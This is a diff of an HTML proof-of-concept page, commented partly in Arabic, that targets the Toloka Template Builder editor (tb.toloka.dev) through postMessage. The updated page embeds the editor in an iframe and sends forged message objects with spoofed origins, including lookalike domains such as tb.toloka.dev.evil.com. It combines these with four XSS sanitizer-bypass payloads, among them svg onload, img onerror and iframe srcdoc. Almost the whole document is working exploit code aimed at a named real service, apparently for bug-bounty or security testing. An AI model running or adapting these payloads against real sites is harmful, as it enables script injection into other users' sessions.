@@ -1,41 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>XSS PoC - Toloka Template Builder</title>
+  <title>SSRF + XSS via postMessage Attack</title>
 </head>
 <body>
-  <h2>🚨 اختبار XSS عبر postMessage</h2>
-  <iframe id="toloka_iframe"
-    src="https://tb.toloka.dev/editor"
-    width="1200"
-    height="800"
-    style="border: 2px solid red;"></iframe>
+  <h2>🚨 XSS Test via postMessage إلى iframe Toloka Builder</h2>
+
+  <iframe id="victim" src="https://tb.toloka.dev/editor" style="width: 90%; height: 600px; border: 2px solid red;"></iframe>
 
   <script>
-    window.onload = function () {
-      const iframe = document.getElementById('toloka_iframe');
+    const iframe = document.getElementById("victim");
 
-      // انتظر تحميل iframe
-      iframe.onload = function () {
-        const targetOrigin = 'https://tb.toloka.dev';
+    const payloads = [
+      `<svg onload=alert('XSS_SVG_BYPASS')>`, // Bypass 1: SVG tag
+      `<img src=x onerror=alert('XSS_IMG')>`, // Bypass 2: onerror
+      `<math><script>alert('XSS_MATH')</script></math>`, // Bypass 3: Math tag
+      `<iframe srcdoc="<script>alert('XSS_IFRAME')</script>">` // Bypass 4: iframe.srcdoc
+    ];
 
-        // حمولة XSS - تعديلها ممكن حسب bypass sanitizer
-        const payload = '<img src=x onerror=alert("🔥 XSS via postMessage")>';
+    const originsToTry = [
+      "https://tb.toloka.dev",              // الرسمي
+      "https://x.tb.toloka.dev",           // نطاق فرعي
+      "https://tb-toloka.dev",             // مشابه
+      "https://evil.toloka.dev",           // متغير
+      "https://tb.toloka.dev.evil.com",    // خداع
+    ];
 
-        // إنشاء رسالة تشبه استجابة fetch
-        const message = {
-          originalEvent: {
-            origin: targetOrigin // أو محاولة bypass مثل attacker.toloka.dev
-          },
-          data: payload
-        };
+    window.onload = () => {
+      setTimeout(() => {
+        originsToTry.forEach((origin) => {
+          payloads.forEach((xss) => {
+            const craftedMessage = {
+              originalEvent: {
+                origin: origin
+              },
+              data: xss
+            };
 
-        // إرسال postMessage مباشرة بعد التحميل
-        iframe.contentWindow.postMessage(message, targetOrigin);
-      };
+            console.log(`[📤] Sending to iframe... origin: ${origin} | payload: ${xss}`);
+            iframe.contentWindow.postMessage(craftedMessage, origin);
+          });
+        });
+      }, 2000); // ننتظر تحميل iframe
     };
   </script>
 </body>
 </html>
-
-
